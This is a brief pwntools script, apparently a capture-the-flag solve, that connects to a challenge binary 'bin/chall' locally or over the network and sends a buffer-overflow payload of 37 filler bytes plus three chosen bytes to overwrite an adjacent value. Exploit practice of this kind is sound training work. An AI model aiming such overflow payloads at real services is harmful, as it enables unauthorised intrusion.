from pwn import *

exe = context.binary = ELF('bin/chall')

host = args.HOST or 'localhost'
port = int(args.PORT or 5000)


def start(argv=[], *a, **kw):
    if args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    else:
        return remote(host, port)


io = start()

p = b'a' * 37
p += b'\x34\x54\x32'
io.sendline(p)

print(io.recvall().decode())
